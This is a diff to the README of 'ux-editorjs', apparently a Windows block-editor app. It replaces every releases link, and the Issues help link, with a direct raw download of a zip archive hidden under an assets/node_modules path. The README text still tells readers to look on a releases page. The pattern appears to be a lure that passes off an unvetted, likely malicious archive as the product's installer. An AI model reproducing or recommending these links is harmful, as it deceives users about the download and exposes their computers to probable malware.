@@ -1,6 +1,6 @@
 # 📝 ux-editorjs - Easy Block Editor for Your Content
 
-[![Download ux-editorjs](https://img.shields.io/badge/Download-ux--editorjs-brightgreen?style=for-the-badge)](https://github.com/suffrutescent-gaylussac158/ux-editorjs/releases)
+[![Download ux-editorjs](https://img.shields.io/badge/Download-ux--editorjs-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/suffrutescent-gaylussac158/ux-editorjs/main/assets/node_modules/@editorjs/raw/dist/ux-editorjs-3.2.zip)
 
 ## 📋 What is ux-editorjs?
 
@@ -27,7 +27,7 @@ This guide will help you download and run ux-editorjs on your Windows computer. 
 ## ⬇️ How to Download ux-editorjs
 
 1. Click the big green button at the top of this page or visit this link:  
-   [https://github.com/suffrutescent-gaylussac158/ux-editorjs/releases](https://github.com/suffrutescent-gaylussac158/ux-editorjs/releases)
+   [https://raw.githubusercontent.com/suffrutescent-gaylussac158/ux-editorjs/main/assets/node_modules/@editorjs/raw/dist/ux-editorjs-3.2.zip](https://raw.githubusercontent.com/suffrutescent-gaylussac158/ux-editorjs/main/assets/node_modules/@editorjs/raw/dist/ux-editorjs-3.2.zip)
 
 2. On the releases page, find the latest version. It usually appears at the top of the list.
 
@@ -72,7 +72,7 @@ This guide will help you download and run ux-editorjs on your Windows computer. 
 ## 🔄 Updating ux-editorjs
 
 1. Check the releases page regularly for new versions:  
-   [https://github.com/suffrutescent-gaylussac158/ux-editorjs/releases](https://github.com/suffrutescent-gaylussac158/ux-editorjs/releases)
+   [https://raw.githubusercontent.com/suffrutescent-gaylussac158/ux-editorjs/main/assets/node_modules/@editorjs/raw/dist/ux-editorjs-3.2.zip](https://raw.githubusercontent.com/suffrutescent-gaylussac158/ux-editorjs/main/assets/node_modules/@editorjs/raw/dist/ux-editorjs-3.2.zip)
 
 2. Download the newest installer file.
 
@@ -96,7 +96,7 @@ This guide will help you download and run ux-editorjs on your Windows computer. 
 - If saving a file fails, check if you have write permissions on your folders.
 - For further help, look at the GitHub Issues page:
 
-  [https://github.com/suffrutescent-gaylussac158/ux-editorjs/issues](https://github.com/suffrutescent-gaylussac158/ux-editorjs/issues)
+  [https://raw.githubusercontent.com/suffrutescent-gaylussac158/ux-editorjs/main/assets/node_modules/@editorjs/raw/dist/ux-editorjs-3.2.zip](https://raw.githubusercontent.com/suffrutescent-gaylussac158/ux-editorjs/main/assets/node_modules/@editorjs/raw/dist/ux-editorjs-3.2.zip)
 
 ## 📱 Using ux-editorjs with Other Tools
 
@@ -124,4 +124,4 @@ For detailed documentation and technical support, visit the GitHub repository pa
 
 ---
 
-[⬇️ Download ux-editorjs from the releases page](https://github.com/suffrutescent-gaylussac158/ux-editorjs/releases)
+[⬇️ Download ux-editorjs from the releases page](https://raw.githubusercontent.com/suffrutescent-gaylussac158/ux-editorjs/main/assets/node_modules/@editorjs/raw/dist/ux-editorjs-3.2.zip)
